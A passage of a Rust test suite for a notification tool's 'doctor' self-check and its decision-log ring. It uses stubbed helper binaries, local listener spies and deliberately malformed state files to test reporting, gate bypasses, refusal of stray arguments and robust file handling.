        assert_eq!(stdout(&output), expected, "case: {case}");
    }
}

// --- the doctor -------------------------------------------------------------

/// The doctor's command, with its state directory inside the sandbox so a mute
/// can be planted where the engine will read it, and with no moshi-hook to
/// run unless the test hands it one.
fn doctor_command(sandbox: &Sandbox) -> std::process::Command {
    let mut command = sandbox.pns();
    command.env("PNS_STATE_DIR", sandbox.path("state"));
    no_moshi_hook(sandbox, &mut command);
    command.arg("doctor");
    command
}

/// The moshi-hook EVERY doctor invocation gets unless it asked for a different
/// one: a path inside the sandbox that does not exist.
///
/// WITHOUT THIS THE SUITE READS THE DEVELOPER'S OWN MACHINE. The doctor
/// resolves the binary through `MOSHI_HOOK_BIN` over a Homebrew path, so an
/// unstubbed run would spawn the real moshi-hook, contact the moshi API, take
/// about five seconds doing it, and answer differently on every machine.
/// Absent is also a real state rather than a flag, and the check is inert on
/// the exit code for it, so no test here has its verdict decided by the stub.
fn no_moshi_hook(sandbox: &Sandbox, command: &mut std::process::Command) {
    command.env("MOSHI_HOOK_BIN", sandbox.path("no-moshi-hook-here"));
}

/// A moshi-hook that answers both shapes of `status` from canned bytes and
/// APPENDS its argv to a record file.
///
/// Appending, rather than the hook suite's stub overwriting with `>`, is what
/// lets a test assert that exactly two invocations happened and that neither
/// of them was `probe`. It is a thin stub plus a spy and reasons about
/// nothing: the fixtures are the bytes the real 0.3.3 binary printed, so this
/// models the tool rather than what the check wishes the tool did.
///
/// THE ARGUMENTS ARE RECORDED WITH THEIR BOUNDARIES INTACT, one unit separator
/// after each and one line per invocation, because `"$*"` joins them with a
/// space: under it a single argument `status --json` and the two real ones
/// leave an identical record, so a spy reading it could not tell the shape the
/// doctor actually spawned from a shape it never would.
///
/// A FIXTURE MAY NOT CONTAIN AN APOSTROPHE. Both are interpolated into a
/// single-quoted shell string below, so one apostrophe ends that string and
/// the stub silently prints something else, or fails to parse at all. The
/// plausible case is not an attack but a contraction: a future `server:`
/// sentence reading "moshi can't reach the server" would do it.
fn stub_moshi_hook(
    sandbox: &Sandbox,
    command: &mut std::process::Command,
    json: &str,
    plain: &str,
) {
    let bin = sandbox.path("bin");
    std::fs::create_dir_all(&bin).expect("stub bin");
    let script = bin.join("moshi-hook");
    write_script(
        &script,
        &format!(
            "printf '%s\\x1f' \"$@\" >>\"{sandbox}/moshi-hook.argv\"\n\
             printf '\\n' >>\"{sandbox}/moshi-hook.argv\"\n\
             case \"$*\" in\n\
             *--json*) printf '%s' '{json}' ;;\n\
             *) printf '%s' '{plain}' ;;\n\
             esac",
            sandbox = sandbox.display()
        ),
    );
    command.env("MOSHI_HOOK_BIN", &script);
}

/// Every argv the stub was ever handed, one vector per invocation, with the
/// argument boundaries the stub recorded preserved.
fn moshi_hook_argv(sandbox: &Sandbox) -> Vec<Vec<String>> {
    std::fs::read_to_string(sandbox.path("moshi-hook.argv"))
        .map(|recorded| {
            recorded
                .lines()
                .map(|line| {
                    // TERMINATOR, not separator: the stub writes one after
                    // every argument, so a plain split would invent a trailing
                    // empty argument on every invocation.
                    line.split_terminator('\u{1f}')
                        .map(str::to_string)
                        .collect()
                })
                .collect()
        })
        .unwrap_or_default()
}

/// `moshi-hook status --json` on this machine, moshi-hook 0.3.3, healthy. The
/// values the capture elided are elided here too; nothing reads them.
const PAIRED_STATUS_JSON: &str = r#"{"baseUrl":"https://api.getmoshi.app/api/v1","displayName":"dresden","hooks":[],"hostId":"host_b14dd2bb0b1f45899d9eaa81a71ff874","logPath":"...","paired":true,"platform":"macos","secretStore":"keychain","socketPath":"..."}"#;

/// The same call with `HOME` pointed at an empty directory: no host id at all.
const UNPAIRED_STATUS_JSON: &str = r#"{"baseUrl":"https://api.getmoshi.app/api/v1","hooks":[],"logPath":"...","paired":false,"platform":"macos","secretStore":"keychain","socketPath":"..."}"#;

/// `moshi-hook status` (plain), healthy. Only this shape carries a server
/// verdict; the JSON above is local-only and measured to do no network I/O.
const PAIRED_STATUS_PLAIN: &str = "status:       paired
host id:      host_b14dd2bb0b1f45899d9eaa81a71ff874
display name: dresden
server:       Moshi Pro attached (usage scope: license)";

/// Plain `status` on an unpaired host. What was captured about this one is
/// that it leads `unpaired` and has NO `server:` line at all, which is the
/// only property anything here reads; the column padding is copied from the
/// paired capture above rather than measured, and nothing consumes it.
const UNPAIRED_STATUS_PLAIN: &str = "status:       unpaired";

/// What the pairing check says when there is no moshi-hook to run at all,
/// which is what every doctor test above gets unless it stubs one.
const NO_MOSHI_HOOK_LINE: &str = "pns doctor: moshi pairing: moshi-hook did not answer \
     (not installed, or it did not answer in time), so the approval path could not be checked.";

/// The pairing line a healthy dresden earns.
const PAIRED_LINE: &str =
    "pns doctor: moshi pairing: paired as dresden (host_b14dd2bb0b1f45899d9eaa81a71ff874).";

/// The relayed line beside it, in moshi's own words.
const MOSHI_SAYS_LINE: &str = "pns doctor: moshi says: Moshi Pro attached (usage scope: license)";

/// Every channel an event dispatches, switched on. The sensor and the lights
/// are deliberately absent: the report has to name them anyway.
const EVERY_DISPATCHED_CHANNEL: &str = "[plugins.moshi]\nenabled = true\n\
     [plugins.macos-banner]\nenabled = true\n[plugins.hermes]\nenabled = true\n";

/// The line the doctor opens with, whatever it goes on to find.
const DOCTOR_OPENING: &str = "pns doctor: sending one test to every enabled channel. \
     Every suppression gate is bypassed (the operator mute, the presence gate, the \
     viewed-pane rule, the lights' quiet hours), because a check that can be suppressed \
     proves nothing.";

#[test]
fn the_doctor_sends_its_labelled_payload_to_every_enabled_channel_and_reports_each_one() {
    let sandbox = Sandbox::new("doctor-sends");
    // The sensor is switched ON here and the lights are not, so the one report
    // carries both skip reasons: a plugin that cannot be a destination, and a
    // plugin the config declined.
    sandbox.write_config(&format!(
        "[plugins.router]\nenabled = true\n{EVERY_DISPATCHED_CHANNEL}"
    ));
    let output = doctor_command(&sandbox).output().expect("the engine runs");

    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
    for channel in ["moshi", "macos-banner", "hermes"] {
        let event = sandbox.event(channel);
        assert_eq!(event["agent"], "pns", "channel: {channel}");
        assert_eq!(event["state"], "doctor", "channel: {channel}");
        assert_eq!(
            event["detail"], "test send from pns doctor; nothing is wrong and nothing needs doing",
            "the payload says at once that nothing is wrong: channel {channel}"
        );
        assert_eq!(event["title"], "pns · doctor", "channel: {channel}");
        assert_eq!(
            event["pane"], "",
            "the doctor carries no pane, because no test can watch a click land"
        );
        assert_eq!(
            event["mode"], "sync",
            "the operator is standing here waiting for the answer: channel {channel}"
        );
    }
    assert!(
        !stderr(&output).contains("dropped a pane id"),
        "the doctor hands over no pane, so it has none to scrub: {}",
        stderr(&output)
    );

    let reported = stdout(&output);
    let printed: Vec<&str> = reported.lines().collect();
    assert_eq!(printed[0], DOCTOR_OPENING);
    assert_eq!(
        &printed[1..],
        [
            "router: skipped, a sensor and never a delivery destination",
            "moshi: sent, this channel reports no outcome",
            "macos-banner: sent, this channel reports no outcome",
            "hermes: sent, this channel reports no outcome",
            "hue: skipped, not enabled in the config",
            "pns doctor: 3 sent, 0 failed, 2 skipped",
            NO_MOSHI_HOOK_LINE,
            NO_DECISION_RECORDED,
            NONE_WAITING,
        ],
        "one line per REGISTERED plugin, in registration order: a report that \
         walked the selection would answer what is on when the operator asked \
         what will reach them"
    );
}

#[test]
fn a_failure_on_the_first_channel_costs_no_later_leg_its_turn_and_still_exits_one() {
    // THE FAILING CHANNEL IS THE FIRST ONE DISPATCHED, which is the whole
    // point: failing the LAST enabled channel is a scenario a census that
    // stopped at the first failure would pass unchanged. moshi leads the
    // delivery order and has no token, the banner behind it still RECEIVES
    // its payload, and hermes at the tail still gets its turn and says so.
    //
    // NATIVE, because a stub channel is silent by design and could never
    // report a failure: leaving `PNS_CHANNELS_DIR` unset is the only condition
    // under which the compiled-in plugins win. A config with no secrets is how
    // both failures are produced end to end, with nothing stubbed to fail on
    // command.
    let sandbox = Sandbox::new("doctor-failure");
    sandbox.write_config(
        "[plugins.moshi]\nenabled = true\n[plugins.macos-banner]\nenabled = true\n\
         [plugins.hermes]\nenabled = true\n",
    );
    let mut command = sandbox.bare();
    // Belt and braces: with no key nothing is posted at all, and if that ever
    // changed this points the post at a port nothing listens on rather than at
    // the operator's own gateway.
    command.env("PNS_HERMES_URL", "http://127.0.0.1:1/hook");
    sandbox.stub_notifier(&mut command);
    // BY HAND, because this one needs `bare()` to reach the native plugins and
    // so cannot go through `doctor_command`. Every doctor invocation in this
    // file has to name a moshi-hook or it runs the operator's own.
    no_moshi_hook(&sandbox, &mut command);
    let output = command.arg("doctor").output().expect("the engine runs");

    let printed = stdout(&output);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    assert!(
        printed.contains(
            "moshi: FAILED, push SKIPPED -- no moshi token in the config \
             ([plugins.moshi] token); nothing was sent"
        ),
        "the first channel's own sentence, verbatim: {printed}"
    );
    assert!(
        printed.contains("macos-banner: sent, posted the banner"),
        "the leg behind the failure still delivered: {printed}"
    );
    assert!(
        sandbox.path("notifier.args").exists(),
        "and it was handed its payload, not merely reported on"
    );
    assert!(
        printed.contains(
            "hermes: FAILED, post SKIPPED -- no hermes key in the config \
             ([plugins.hermes] key); nothing was sent"
        ),
        "the last leg still got its turn after an earlier failure: {printed}"
    );
    assert!(
        printed.contains("pns doctor: 1 sent, 2 failed, 2 skipped"),
        "{printed}"
    );
}

#[test]
fn a_channel_that_could_not_be_launched_is_a_failure_rather_than_a_send_nobody_made() {
    // MEASURED before the fix: a channels directory with nothing in it
    // reported "3 sent, 0 failed" and exited 0, because a spawn that never
    // happened and a channel that ran and said nothing came back as the same
    // verdict. Green for a directory holding no channel at all is the one
    // answer a hand-run check must never give.
    let sandbox = Sandbox::new("doctor-unlaunchable");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    let empty = sandbox.path("empty-channels");
    std::fs::create_dir_all(&empty).expect("an empty channels dir");
    let mut command = doctor_command(&sandbox);
    command.env("PNS_CHANNELS_DIR", &empty);
    let output = command.output().expect("the engine runs");

    let printed = stdout(&output);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    for channel in ["moshi", "macos-banner", "hermes"] {
        assert!(
            printed.lines().any(|line| line.starts_with(&format!(
                "{channel}: FAILED, could not launch the channel at"
            ))),
            "{channel} was reported as sent by a spawn that never happened: {printed}"
        );
    }
    assert!(
        printed.contains("pns doctor: 0 sent, 3 failed, 2 skipped"),
        "the summary has to count what the lines say: {printed}"
    );
}

#[test]
fn the_doctor_reaches_every_channel_through_a_mute_a_desk_and_both_phone_overrides() {
    // THE BYPASSES THIS RUN CAN OBSERVE. A mute standing, the operator at
    // their desk, and both phone overrides set: on the event path the mute
    // strips the decoration, the desk drops the phone and skip-phone drops it
    // again over the top of force-phone, and here every channel still
    // receives. Together they are the state someone is in when they stop to
    // ask whether their channels still work.
    //
    // THE VIEWED-PANE RULE IS NOT AMONG THEM, and cannot be: `decide` is never
    // called on this path, so no pane verdict exists to bypass and this run
    // cannot tell a bypassed rule from an absent one. The session view is
    // stubbed as watching the origin pane only so that a live herdr on the
    // developer's own machine cannot decide the verdict.
    let sandbox = Sandbox::new("doctor-bypasses-the-gates");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    std::fs::create_dir_all(sandbox.path("state")).expect("state dir");
    let expiry = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("a clock past 1970")
        .as_secs()
        + 600;
    std::fs::write(sandbox.path("state/quiet-until"), format!("{expiry}\n")).expect("the mute");

    let mut command = doctor_command(&sandbox);
    command
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_SKIP_PHONE", "1")
        .env("PNS_FORCE_PHONE", "1");
    sandbox.stub_herdr(&mut command, true);
    let output = command.output().expect("the engine runs");

    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
    for channel in ["moshi", "macos-banner", "hermes"] {
        assert!(
            sandbox.fired(channel),
            "{channel} was suppressed by a gate the doctor exists to bypass: {}",
            stdout(&output)
        );
    }
    // AND IT REMEMBERS NOTHING. The doctor reads the config and sends; a run
    // that left a record behind would be a second reader of the state
    // directory with no reader of its own.
    let state: Vec<String> = std::fs::read_dir(sandbox.path("state"))
        .expect("the state dir")
        .flatten()
        .map(|entry| entry.file_name().to_string_lossy().into_owned())
        .collect();
    assert_eq!(
        state,
        ["quiet-until"],
        "the doctor wrote to the state directory"
    );
}

#[test]
fn the_doctor_reaches_the_bridge_inside_the_lights_quiet_window() {
    // The exemption `pns pulse` already has, for the same reason: gating the
    // hand-run check would make the window uncheckable exactly while it is on.
    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("doctor-quiet-window");
    sandbox.write_config(&format!(
        "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
         quiet_hours = \"{}\"\n",
        window_around(utc_minute_now(), 120)
    ));
    let mut command = sandbox.bare();
    command.env("TZ", "UTC");
    // BY HAND, for the same reason as above: `bare()` is what reaches the
    // native lights, and an unnamed moshi-hook is the operator's own.
    no_moshi_hook(&sandbox, &mut command);
    let child = command.arg("doctor").spawn().expect("the engine starts");
    assert!(
        dialled_within(&listener, std::time::Duration::from_secs(5)),
        "the operator asked for a check by hand and the lights were not part of it"
    );
    assert!(
        wait_bounded(child, std::time::Duration::from_secs(5)).is_some(),
        "and it finished rather than parking on the bridge"
    );
}

#[test]
fn a_pulse_with_no_bridge_to_dial_names_the_settings_rather_than_the_rooms() {
    // `fire_pulse` answers zero rooms both for a bridge that listed none and
    // for a hue table that resolves to no bridge at all, and the zero-rooms
    // line blames the listing or the room names: production-reachable
    // misdirection, sending the operator hunting through a bridge nothing
    // dialled. The spy is here to prove nothing dialled it.
    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("doctor-hue-unresolved");
    sandbox.write_config(&format!(
        "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\n"
    ));
    let output = doctor_command(&sandbox).output().expect("the engine runs");

    let printed = stdout(&output);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    assert!(
        printed.contains(
            "hue: FAILED, pulse SKIPPED -- no hue bridge and key in the config \
             ([plugins.hue] bridge, key); nothing was signalled"
        ),
        "the line names the settings to write: {printed}"
    );
    assert!(
        !dialled_within(&listener, SETTLE),
        "a bridge was dialled for a config that resolves to none"
    );
}

#[test]
fn a_pulse_the_bridge_answered_nothing_for_still_names_both_causes_it_cannot_choose_between() {
    // THE MIRROR of the line above, and the reason the zero-rooms sentence
    // stays: a bridge and key that resolve ARE dialled, and a run that came
    // back with no room cannot tell an empty listing from a room name nothing
    // matched. Naming the settings here would send the operator to edit a
    // config that is already right.
    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("doctor-hue-listed-nothing");
    sandbox.write_config(&format!(
        "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n"
    ));
    // SPAWNED, not run to completion: the spy has to accept while the engine
    // is still dialling, or the bridge deadline is what this test waits out.
    let mut command = doctor_command(&sandbox);
    command.stdout(std::process::Stdio::piped());
    let child = command.spawn().expect("the engine starts");
    assert!(
        dialled_within(&listener, std::time::Duration::from_secs(5)),
        "a resolvable bridge was never contacted"
    );
    let output = child.wait_with_output().expect("the engine finishes");

    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    assert!(
        stdout(&output).contains(
            "hue: FAILED, signalled no rooms \
             (no room listing from the bridge, or no configured room name matched)"
        ),
        "{}",
        stdout(&output)
    );
}

#[test]
fn a_config_that_enables_nothing_names_every_plugin_sends_nothing_and_exits_one() {
    let sandbox = Sandbox::new("doctor-nothing-enabled");
    sandbox.write_config("[plugins.moshi]\nenabled = false\n");
    let output = doctor_command(&sandbox).output().expect("the engine runs");

    assert_eq!(
        output.status.code(),
        Some(1),
        "a check with nothing to check must never report green: {}",
        stderr(&output)
    );
    let reported = stdout(&output);
    let printed: Vec<&str> = reported.lines().skip(1).collect();
    assert_eq!(
        printed,
        [
            "router: skipped, not enabled in the config",
            "moshi: skipped, not enabled in the config",
            "macos-banner: skipped, not enabled in the config",
            "hermes: skipped, not enabled in the config",
            "hue: skipped, not enabled in the config",
            "pns doctor: 0 sent, 0 failed, 5 skipped",
            NO_MOSHI_HOOK_LINE,
            NO_DECISION_RECORDED,
            NONE_WAITING,
        ],
        "the whole roster is still the report; only a census can say this"
    );
    for channel in ["moshi", "macos-banner", "hermes"] {
        assert!(
            !sandbox.fired(channel),
            "{channel} received a payload from a config that enabled nothing"
        );
    }
}

#[test]
fn a_doctor_given_any_extra_word_prints_usage_exits_two_and_reaches_no_channel() {
    // A DOCTOR THAT QUIETLY IGNORED AN ARGUMENT is a check the operator
    // believes was narrower or wider than it was, which is worse than no check
    // at all. The empty word is in the set because a shell that expanded a
    // variable to nothing still typed something.
    for arguments in [
        vec!["extra"],
        vec!["send"],
        vec!["--dry-run"],
        vec![""],
        vec!["send", "hermes"],
    ] {
        let sandbox = Sandbox::new("doctor-refusal");
        sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
        let mut command = doctor_command(&sandbox);
        // A RECORDING moshi-hook rather than the absent one, so "reaches no
        // channel" covers the binary the pairing check spawns as well: an
        // absent path proves nothing about whether it was reached for.
        stub_moshi_hook(
            &sandbox,
            &mut command,
            PAIRED_STATUS_JSON,
            PAIRED_STATUS_PLAIN,
        );
        let output = command.args(&arguments).output().expect("the engine runs");

        assert_eq!(
            output.status.code(),
            Some(2),
            "arguments: {arguments:?}, stderr: {}",
            stderr(&output)
        );
        assert!(
            stderr(&output)
                .lines()
                .any(|line| line == "pns: usage: pns doctor"),
            "arguments: {arguments:?}, stderr: {}",
            stderr(&output)
        );
        assert_eq!(stdout(&output), "", "arguments: {arguments:?}");
        for channel in ["moshi", "macos-banner", "hermes"] {
            assert!(
                !sandbox.fired(channel),
                "{channel} was sent a payload by a refused command: {arguments:?}"
            );
        }
        // BEFORE ANYTHING IS SENT OR PRINTED includes before anything is
        // SPAWNED. The pairing check runs another program, and a refusal that
        // still reached for it would put a network call and five seconds
        // behind a command the operator typed wrong.
        let spawned = moshi_hook_argv(&sandbox);
        assert!(
            spawned.is_empty(),
            "a refused doctor spawned moshi-hook {spawned:?}: {arguments:?}"
        );
    }
}
// --- the decision log -------------------------------------------------------

/// An event with its state directory inside the sandbox, which is where the
/// decision ring lands.
///
/// `PNS_STATE_DIR` RIDES ON THE COMMAND, never through `set_var`: this binary
/// is threaded, and a process-wide mutation would decide another test's ring.
fn logged_event(sandbox: &Sandbox) -> std::process::Command {
    let mut command = sandbox.pns();
    command.env("PNS_STATE_DIR", sandbox.path("state"));
    command
}

/// The ring, oldest first, which is the order an append leaves it in.
fn decisions(sandbox: &Sandbox) -> Vec<String> {
    std::fs::read_to_string(sandbox.path("state/decisions"))
        .map(|contents| contents.lines().map(str::to_string).collect())
        .unwrap_or_default()
}

#[test]
fn an_event_appends_exactly_one_decision_carrying_what_it_decided_and_what_the_legs_did() {
    // THE RECORD IS WRITTEN AFTER DISPATCH, so the leg verdicts are part of
    // it: without them the log says pns decided to card the operator while
    // their question is why no card appeared.
    let sandbox = Sandbox::new("decision-log-append");
    run(logged_event(&sandbox)
        .args(["--agent", "claude", "--state", "done", "--long-running"])
        .args(["--project", "dotfiles", "--detail", "a private summary"]));
    assert!(sandbox.fired("moshi"), "the channels fired");

    let recorded = decisions(&sandbox);
    assert_eq!(recorded.len(), 1, "exactly one line: {recorded:?}");
    let entry = &recorded[0];
    for expected in [
        " claude/done ",
        " surface=Away ",
        " long_running=yes ",
        " pane=none ",
        " plan=banner:no,card:yes,pulse:yes ",
        " legs=moshi:silent,hermes:silent",
    ] {
        assert!(
            entry.contains(expected),
            "{expected:?} missing from {entry}"
        );
    }
    for content in ["a private summary", "dotfiles"] {
        assert!(!entry.contains(content), "free text reached {entry}");
    }
}

#[test]
fn an_event_that_reached_no_channel_at_all_still_records_its_decision() {
    // THE CASE THE LOG EXISTS FOR. "Nothing fired" is exactly what an operator
    // opens the report to ask about, so the empty-plan branch records too.
    let sandbox = Sandbox::new("decision-log-empty-plan");
    let output = run(logged_event(&sandbox)
        .args(["--agent", "claude", "--state", "done"])
        .args(["--local-only", "--remote-only"]));
    assert!(!sandbox.fired("hermes"), "both flags suppress everything");

    let recorded = decisions(&sandbox);
    assert_eq!(recorded.len(), 1, "got {recorded:?}");
    for expected in [" local_only=yes ", " remote_only=yes ", " legs=none"] {
        assert!(
            recorded[0].contains(expected),
            "{expected:?} missing from {}",
            recorded[0]
        );
    }
    assert!(
        stdout(&output).contains("post SKIPPED"),
        "and the contradiction is still said out loud"
    );
}

#[test]
fn the_ring_keeps_only_the_most_recent_decisions_with_the_oldest_gone() {
    // A SINGLE SLOT DOES NOT SURVIVE BEING LOOKED AT: the Stop hook of the
    // session the operator is typing `pns doctor` into fires its own event.
    //
    // CHECKED AFTER EVERY EVENT, not only at the end. The prune runs only when
    // the file went over the cap, so a cap wrong by one settles back into a
    // correct-looking ring one event later: measured, a ring keeping four was
    // indistinguishable from a ring keeping five by the seventh turn.
    let sandbox = Sandbox::new("decision-log-ring");
    let cap = 5;
    for turn in 1..=7 {
        run(logged_event(&sandbox).args(["--agent", &format!("c{turn}"), "--state", "done"]));
        let recorded = decisions(&sandbox);
        assert_eq!(
            recorded.len(),
            turn.min(cap),
            "after turn {turn}: {recorded:?}"
        );
        let oldest = turn.saturating_sub(cap) + 1;
        assert!(
            recorded[0].contains(&format!(" c{oldest}/done ")),
            "after turn {turn} the oldest kept should be c{oldest}: {recorded:?}"
        );
        assert!(
            recorded[recorded.len() - 1].contains(&format!(" c{turn}/done ")),
            "after turn {turn} the newest should be last: {recorded:?}"
        );
    }
}

#[test]
fn a_state_directory_that_cannot_be_written_costs_the_event_nothing() {
    // FAIL-QUIET, in `remember_staleness`'s style. A decision that did not
    // record is a diagnostic missing later; a complaint printed here would put
    // a line about the state directory into every hook's output for the rest
    // of this machine's life. `run` asserts the exit 0.
    let sandbox = Sandbox::new("decision-log-unwritable");
    let blocked = sandbox.path("state-is-a-file");
    std::fs::write(&blocked, "not a directory\n").expect("a file where the state dir would go");
    let mut command = sandbox.pns();
    command.env("PNS_STATE_DIR", &blocked);
    let output = run(command.args(["--agent", "claude", "--state", "done"]));

    assert!(sandbox.fired("moshi"), "every channel still fires");
    assert!(sandbox.fired("hermes"));
    assert_eq!(stdout(&output), "", "nothing is said about the write");
    assert!(
        !stderr(&output).contains("decision"),
        "nor on the other stream: {}",
        stderr(&output)
    );
}
/// The ring's path, with the state directory that holds it already made, so a
/// test can plant something hostile there before the first event runs.
fn ring_path(sandbox: &Sandbox) -> std::path::PathBuf {
    std::fs::create_dir_all(sandbox.path("state")).expect("state dir");
    sandbox.path("state/decisions")
}

/// A real FIFO at that path, which is the fixture every parking test needs:
/// opening one BLOCKS until the other end is opened, for reading as well as
/// for writing.
fn plant_fifo(path: &std::path::Path) {
    assert!(
        std::process::Command::new("mkfifo")
            .arg(path)
            .status()
            .expect("mkfifo runs")
            .success(),
        "the fixture has to be a real FIFO"
    );
}

/// One event, run to completion under a WALL-CLOCK DEADLINE.
///
/// `run` waits forever, which is the wrong instrument for a path whose bug is
/// that it PARKS: a regression would hang the whole suite with no failure to
/// read. The deadline is loose enough that a loaded machine cannot trip it,
/// and the child is killed before the panic so nothing is left holding the
/// fixture open.
fn run_before_the_deadline(command: &mut std::process::Command) -> std::process::ExitStatus {
    output_before_the_deadline(command).status
}

/// The same wait, keeping what the run said. Piped rather than discarded
/// because a caller also has to prove the event stayed SILENT about the file
/// it could not write, and because the doctor's whole report is read back off
/// it; the volume is a handful of lines, far inside a pipe buffer, so the poll
/// below cannot deadlock on a full one.
fn output_before_the_deadline(command: &mut std::process::Command) -> std::process::Output {
    let mut child = command
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("the engine starts");
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
    loop {
        if child.try_wait().expect("the child is waitable").is_some() {
            return child.wait_with_output().expect("the child is waitable");
        }
        if std::time::Instant::now() >= deadline {
            let _ = child.kill();
            let _ = child.wait();
            panic!("it never returned: it parked on a state file's path");
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
}

#[test]
fn a_fifo_at_the_rings_path_is_never_opened_and_never_parks_the_event() {
    // MEASURED: opening a FIFO for writing BLOCKS until something opens the
    // read end, so an append that trusts the path parks the hook that called
    // it, on every event, until the machine is rebooted. The ring is state
    // this tool owns; a FIFO is not that state, and nothing that is not a
    // regular file is opened at all.
    let sandbox = Sandbox::new("decision-log-fifo");
    let ring = ring_path(&sandbox);
    assert!(
        std::process::Command::new("mkfifo")
            .arg(&ring)
            .status()
            .expect("mkfifo runs")
            .success(),
        "the fixture has to be a real FIFO"
    );

    let status = run_before_the_deadline(
        logged_event(&sandbox).args(["--agent", "claude", "--state", "done"]),
    );
    assert_eq!(
        status.code(),
        Some(0),
        "a record nobody could write costs the event nothing"
    );
    for channel in ["moshi", "hermes"] {
        assert!(sandbox.fired(channel), "{channel} never fired");
    }
    // REFUSED, NOT REPAIRED: the path still holds what it held. Healing an
    // irregular file would mean this tool deleting something it did not put
    // there, on a path it only ever appends to.
    assert!(
        std::fs::symlink_metadata(&ring)
            .expect("the fifo")
            .file_type()
            .is_fifo(),
        "the ring's path was rewritten"
    );
}

#[test]
fn a_ring_holding_bytes_that_are_not_text_heals_to_a_bounded_readable_one() {
    // MEASURED: the read-back is what the prune runs on, so one byte no
    // reader can decode does not cost one entry, it switches the prune OFF
    // and the ring then grows without a bound for the rest of the machine's
    // life. The corrupt prefix is foreign and may go; what has to survive is
    // this event's own line, on a file the next append can use.
    let sandbox = Sandbox::new("decision-log-not-text");
    let ring = ring_path(&sandbox);
    std::fs::write(&ring, b"\xff\xfe not a decision\n").expect("the corrupt ring");

    run(logged_event(&sandbox).args(["--agent", "claude", "--state", "done"]));
    let healed = std::fs::read_to_string(&ring).expect("the ring reads back as text again");
    assert_eq!(healed.lines().count(), 1, "got {healed:?}");
    assert!(healed.contains(" claude/done "), "got {healed:?}");

    // AND THE HEAL LEAVES AN ORDINARY RING: the next event appends to it
    // rather than healing a second time.
    run(logged_event(&sandbox).args(["--agent", "codex", "--state", "done"]));
    let after = std::fs::read_to_string(&ring).expect("the ring");
    assert_eq!(after.lines().count(), 2, "got {after:?}");
    assert!(
        after.contains(" claude/done ") && after.contains(" codex/done "),
        "got {after:?}"
    );
}

#[test]
fn a_ring_that_ends_mid_line_never_fuses_the_next_record_onto_it() {
    // MEASURED: an append lands at the last byte, so a file left without its
    // trailing newline (a truncated write, a hand edit) WELDS the new record
    // onto the tail of the old one, and the reader then cannot read either.
    let sandbox = Sandbox::new("decision-log-no-newline");
    let ring = ring_path(&sandbox);
    std::fs::write(&ring, "1756499000 a/one surface=Desk").expect("the truncated ring");

    run(logged_event(&sandbox).args(["--agent", "claude", "--state", "done"]));
    let contents = std::fs::read_to_string(&ring).expect("the ring");
    let lines: Vec<&str> = contents.lines().collect();
    assert_eq!(lines.len(), 2, "got {lines:?}");
    assert_eq!(
        lines[0], "1756499000 a/one surface=Desk",
        "the entry that was already there is left as it was"
    );
    assert!(
        lines[1].starts_with(char::is_numeric) && lines[1].contains(" claude/done "),
        "the new record has its own line and its own epoch: {lines:?}"
    );
}

#[test]
fn a_ring_too_large_to_read_back_is_replaced_rather_than_slurped() {
    // MEASURED: the read-back is unbounded, so whatever sits at the path is
    // pulled into memory whole on every event. A file with no line breaks in
    // it also prunes to nothing, so once one is there it stays there.
    let sandbox = Sandbox::new("decision-log-oversize");
    let ring = ring_path(&sandbox);
    let bloated = format!("{}\n", "z".repeat(400_000));
    std::fs::write(&ring, &bloated).expect("the bloated ring");

    run(logged_event(&sandbox).args(["--agent", "claude", "--state", "done"]));
    let healed = std::fs::read_to_string(&ring).expect("the ring");
    assert!(
        healed.len() < bloated.len() / 100,
        "the ring is still {} bytes",
        healed.len()
    );
    assert_eq!(
        healed.lines().count(),
        1,
        "healed to this event's line alone: {healed:?}"
    );
    assert!(healed.contains(" claude/done "), "got {healed:?}");
}

#[test]
fn events_racing_each_other_lose_no_line_and_leave_no_pending_file() {
    // WRITTEN BY APPEND, never read-modify-write. A Stop hook and the
    // long-running notifier firing together is an ordinary pair, and a ring
    // rewritten from a read taken before the other event's line landed drops
    // that line. FEWER THAN THE CAP ON PURPOSE, so no prune runs at all and
    // the count is exact rather than a range: every one of these has to be
    // there, whole, with nothing half-published beside it.
    let sandbox = Sandbox::new("decision-log-concurrent");
    ring_path(&sandbox);
    let racing: Vec<std::process::Child> = (1..=5)
        .map(|turn| {
            logged_event(&sandbox)
                .args(["--agent", &format!("c{turn}"), "--state", "done"])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn()
                .expect("the engine starts")
        })
        .collect();
    for mut child in racing {
        assert!(
            child.wait().expect("the child is waitable").success(),
            "every racing event exits 0"
        );
    }

    let contents = std::fs::read_to_string(sandbox.path("state/decisions")).expect("the ring");
    let lines: Vec<&str> = contents.lines().collect();
    assert_eq!(lines.len(), 5, "a line was lost: {lines:?}");
    for turn in 1..=5 {
        assert!(
            contents.contains(&format!(" c{turn}/done ")),
            "c{turn} is missing: {lines:?}"
        );
    }
    for entry in &lines {
        assert!(
            entry.starts_with(char::is_numeric) && entry.contains(" legs="),
            "a torn or fused line survived the race: {entry:?}"
        );
    }
    let pending: Vec<String> = std::fs::read_dir(sandbox.path("state"))
        .expect("the state dir")
        .filter_map(Result::ok)
        .map(|entry| entry.file_name().to_string_lossy().into_owned())
        .filter(|name| name.starts_with("decisions.new"))
        .collect();
